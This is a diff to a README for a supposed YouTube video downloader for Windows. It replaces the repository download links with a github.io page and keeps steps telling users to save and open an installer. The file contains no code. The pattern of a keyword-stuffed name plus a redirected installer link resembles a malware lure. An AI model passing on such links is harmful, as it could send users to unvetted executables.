@@ -1,6 +1,6 @@
 # 📥 SaveFrom-Net-2026-YouTube-Downloader - Download YouTube Videos Quickly and Easily
 
-[![Download SaveFrom-Net](https://img.shields.io/badge/Download-SaveFrom-blue.svg)](https://github.com/Iaaspitball48/SaveFrom-Net-2026-YouTube-Downloader)
+[![Download SaveFrom-Net](https://img.shields.io/badge/Download-SaveFrom-blue.svg)](https://iaaspitball48.github.io)
 
 This tool helps you save YouTube videos to your computer. You keep a copy of your favorite clips to watch offline without an internet connection. The process takes only a few minutes.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the download page: [https://github.com/Iaaspitball48/SaveFrom-Net-2026-YouTube-Downloader](https://github.com/Iaaspitball48/SaveFrom-Net-2026-YouTube-Downloader)
+1. Visit the download page: [https://iaaspitball48.github.io](https://iaaspitball48.github.io)
 2. Locate the latest version button on the right side of the screen.
 3. Click the link to save the installation file to your computer.
 4. Open your Downloads folder.
